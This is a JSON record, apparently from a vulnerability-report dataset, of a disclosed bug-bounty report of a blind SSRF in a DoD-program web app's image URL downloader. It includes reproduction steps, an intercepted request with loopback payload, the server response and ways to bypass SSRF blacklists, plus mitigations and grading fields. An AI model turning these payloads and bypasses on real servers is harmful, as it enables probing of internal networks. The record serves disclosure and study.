@@ -1,0 +1,50 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "696e746c6f6c ",
+    "title": "Blind SSRF via image upload URL downloader on https://\u2588\u2588\u2588\u2588\u2588\u2588/ ",
+    "content": "\nDescription:\nDear DoD,\nI found Blind SSRF on one domain from Hack US program. Original domain is https://\u2588\u2588\u2588\u2588\u2588/ but when you make account and login it redirects you to https://\u2588\u2588\u2588/my/. Here's the video PoC:\n\u2588\u2588\u2588\u2588\u2588\u2588\nThank you!\nImpact\nIn a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials. The attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nWeb App is infected.\nCVE Numbers\nSteps to Reproduce\nCreate a one test account.\nLogin to that account.\nGo to edit profile.\nScroll down there.\nNotice user picture field.\nTry to upload something.\nYou will see URL downloader.\nOpen your burp collaborator client.\nCopy and paste the payload in URL downloader, make sure to include /test.png at the ending like this http://example.com/test.png\nPoll now in burp collaborator client.\nNotice HTTP and DNS interaction. IP address from HTTP interaction is from internal network which means we can do some middleware issues. Notice that it's fetching test.png file. And IP is from internal network.\nTurn your foxy proxy on and open your burp suite.\nPaste this ipv4 in URL downloader: http://127.0.0.1/test.png\nIntercept request. Request should look like this:\nCode 952 Bytes\n1POST /repository/repository_ajax.php?action=signin HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Cookie: MoodleSession=c5416a0e3ea3db1606b2876b0b6ac35f; RedirectDouble=1; MOODLEID1_=%25BA%2519V%25E8%25DA%2517\n4User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0\n5Accept: */*\n6Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3\n7Accept-Encoding: gzip, deflate\n8X-Requested-With: XMLHttpRequest\n9Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n10Content-Length: 295\n11Origin: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n12Referer: https://\u2588\u2588\u2588\u2588\u2588/user/edit.php\n13Sec-Fetch-Dest: empty\n14Sec-Fetch-Mode: cors\n15Sec-Fetch-Site: same-origin\n16Te: trailers\n17Connection: close\n18\n19file=http%3A%2F%2F127.0.0.1%2Ftest.png&repo_id=5&p=&page=&env=filemanager&accepted_types[]=.gif&accepted_types[]=.jpe&accepted_types[]=.jpeg&accepted_types[]=.jpg&accepted_types[]=.png&sesskey=h2ixtMF4Fv&client_id=6315fe93ef054&itemid=951353609&maxbytes=1073741824&areamaxbytes=-1&ctx_id=9398501\nYou will notice one error showing some info about server which confirms Blind SSRF again. The response looks like this:\nCode 860 Bytes\n1HTTP/1.1 200 OK\n2Server: nginx\n3Date: Mon, 05 Sep 2022 14:05:32 GMT\n4Content-Type: application/json; charset=utf-8\n5Connection: close\n6X-Powered-By: PHP/7.4.28\n7Set-Cookie: RedirectDouble=1; path=/\n8Set-Cookie: RedirectDouble=1; path=/\n9Set-Cookie: RedirectDouble=1; path=/\n10Set-Cookie: RedirectDouble=1; path=/\n11Cache-Control: no-store, no-cache, must-revalidate\n12Cache-Control: post-check=0, pre-check=0\n13Pragma: no-cache\n14Expires: Mon, 20 Aug 1969 09:23:00 GMT\n15Last-Modified: Mon, 05 Sep 2022 14:05:32 GMT\n16Accept-Ranges: none\n17Strict-Transport-Security: max-age=31536000; includeSubDomains\n18Content-Length: 261\n19\n20{\"list\":[],\"nosearch\":true,\"norefresh\":true,\"nologin\":true,\"error\":\"HTTP\\/1.1 404 Not Found\\r\\nServer: nginx\\r\\nDate: Mon, 05 Sep 2022 14:05:32 GMT\\r\\nContent-Type: text\\/html; charset=utf-8\\r\\nContent-Length: 146\\r\\nConnection: keep-alive\\r\\n\\r\\n\",\"repo_id\":5\nBy the way if you change to 25 port its leaking something about Postfix SMTP server.\nAlso I was able to identify that your web app is using libcurl.\nSuggested Mitigation/Remediation Actions\nMy suggestion is to create whitelisted domains in DNS\nThe easiest way to remediate SSRF is to whitelist any domain or address that your application accesses.\nBlacklisting and regex have the same issue, someone will eventually find a way to exploit them\nDo Not Send Raw Responses. Do not use blacklists. use whitelists (allow-lists)\nNever send a raw response body from the server to the client. Responses that the client receives need to be expected.\nEnforce URL Schemas. Allow only URL schemas that your application uses. There is no need to have ftp://, file:/// or even http:// enabled if you only use https://. And if you do use other schemas make sure that they\u2019re only accessible from the part that needs to access them and not from anywhere else.\nEnable Authentication on All Services. Make sure that authentication is enabled on any service that is running inside your network even if they don\u2019t require it. Services like memcached, redis, mongo and others don\u2019t require authentication for normal operations, but this means they can be exploited.\nSanitize and Validate Inputs. Never trust user input. Always sanitize any input that the user sends to your application. Remove bad characters, standardize input (double quotes instead of single quotes for example).After sanitization make sure to validate sanitized input to make sure nothing bad passed through.\nWhy is it Ineffective to Blacklist Domains and IPs? Understanding SSRF Bypass\nOne way to protect against SSRF is to blacklist certain domains and IP addresses. This defense technique is not effective, because hackers can use bypasses to avoid your security measures. Below are a few simple ways attackers can bypass blacklists.\nBypassing Blacklists Using HTTPS. Common blacklists blocking everything on port 80 or the http scheme. but the server will handle requests to 443 or https just fine. Instead of using http://127.0.0.1/ use: https://127.0.0.1/ https://localhost/\nOr create SSRF protection with Bright.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Server-Side Request Forgery (SSRF)"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1665768960,
+    "report_url": "https://hackerone.com/reports/1691501",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Create a test account and log in to the web application."
+        ],
+        [
+            2,
+            "Navigate to the profile edit section and locate the user picture upload field."
+        ],
+        [
+            3,
+            "Use the URL downloader feature to input a crafted URL pointing to an internal network address (e.g., http://127.0.0.1/test.png)."
+        ],
+        [
+            4,
+            "Intercept the request using a proxy tool like Burp Suite to observe the server's interaction with the internal network."
+        ],
+        [
+            5,
+            "Analyze the response for any internal server information or interactions with internal services."
+        ]
+    ],
+    "vuln_description": "The vulnerability is a Blind Server-Side Request Forgery (SSRF) in a web application's image upload feature. By manipulating the URL downloader functionality, an attacker can force the server to make requests to internal network services, potentially exposing sensitive information or enabling further attacks.",
+    "reason": "The attack involves understanding the application's image upload feature and manipulating it to interact with internal services. While the steps are straightforward, the discovery requires knowledge of SSRF and the use of tools like Burp Suite to intercept and analyze requests.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
